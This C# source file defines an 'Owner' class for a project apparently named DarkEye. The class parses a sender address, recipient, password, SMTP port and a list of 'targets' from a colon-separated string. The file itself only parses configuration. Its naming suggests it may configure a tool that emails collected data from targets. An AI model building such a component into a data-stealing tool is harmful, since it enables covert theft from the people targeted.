using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DarkEye.Classes.Objects
{
    /*
    * Created by Gish_Reloaded on 27/03/2020.
    */
    class Owner
    {
        public String from;
        public String to;
        public String pass;
        public int port;

        public ArrayList targets;

        public Owner(Data data)
        {
            this.targets = new ArrayList();
            this.from = data.GetDataByIndex(0);
            this.to = data.GetDataByIndex(1);
            this.pass = data.GetDataByIndex(2);
            try
            {
                this.port = Int32.Parse(data.GetDataByIndex(3));
            }
            catch (Exception ex)
            {
                this.port = 587;
            }

            String dataStr = data.GetData();
            String[] split = dataStr.Split(':');
            
            for(int i = 4; i < split.Length; i++)
            {
                String target = split[i];
                targets.Add(target);
            }
        }
    }
}
